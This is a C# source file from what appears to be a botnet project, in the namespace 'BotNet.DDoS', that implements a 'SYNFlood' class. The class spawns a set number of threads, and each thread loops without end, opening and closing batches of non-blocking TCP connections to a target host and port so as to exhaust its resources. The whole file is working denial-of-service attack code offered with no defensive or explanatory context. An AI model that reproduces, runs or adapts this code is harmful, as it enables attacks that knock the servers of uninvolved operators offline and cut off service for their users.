
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace BotNet.DDoS
{
    public static class SYNFlood
    {
        private static Thread[] floodingThread;
        public static string Host;
        public static ushort Port;
        public static int ISSockets;
        public static int ThreadsCount;

        public static void StartSYNFlood()
        {
            IPEndPoint IPEo;

            try
            {
                IPEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                IPEo = new IPEndPoint(IPAddress.Parse(Host), Port);
            }

            floodingThread = new Thread[ThreadsCount];
            ThreadStart[] floodingJob = new ThreadStart[ThreadsCount];
            SYNRequest[] SYNClass = new SYNRequest[ThreadsCount];

            for (int i = 0; i < ThreadsCount; i++)
            {
                SYNClass[i] = new SYNRequest(IPEo, ISSockets);
                floodingJob[i] = new ThreadStart(SYNClass[i].Send);
                floodingThread[i] = new Thread(floodingJob[i]);
                floodingThread[i].Start();
            }
        }

        public static void StopSYNFlood()
        {
            for (int i = 0; i < ThreadsCount; i++)
            {
                try
                {
                    floodingThread[i].Abort();
                    floodingThread[i].Join();
                }
                catch { }
            }
        }

        private class SYNRequest
        {
            private IPEndPoint IPEo;
            private Socket[] pSocket;
            private int iSSockets;

            public SYNRequest(IPEndPoint tIPEo, int tSSockets)
            {
                this.IPEo = tIPEo;
                this.iSSockets = tSSockets;
            }

            private void OnConnect(IAsyncResult ar)
            {
            }

            public void Send()
            {
                int iNum;
                while (true)
                {
                    try
                    {
                        pSocket = new Socket[iSSockets];

                        for (iNum = 0; iNum < iSSockets; iNum++)
                        {
                            pSocket[iNum] = new Socket(IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                            pSocket[iNum].Blocking = false;
                            AsyncCallback aCallback = new AsyncCallback(OnConnect);
                            pSocket[iNum].BeginConnect(IPEo, aCallback, pSocket[iNum]);
                        }

                        Thread.Sleep(100);

                        for(iNum = 0; iNum < iSSockets; iNum++)
                        {
                            if (pSocket[iNum].Connected)
                            {
                                pSocket[iNum].Disconnect(false);
                            }
                            pSocket[iNum].Close();
                            pSocket[iNum] = null;
                        }

                        pSocket = null;
                    }
                    catch
                    {
                        for(iNum = 0; iNum < iSSockets; iNum++)
                        {
                            try
                            {
                                if (pSocket[iNum].Connected)
                                {
                                    pSocket[iNum].Disconnect(false);
                                }
                                pSocket[iNum].Close();
                                pSocket[iNum] = null;
                            }
                            catch { }
                        }
                    }
                }
            }
        }
    }
}
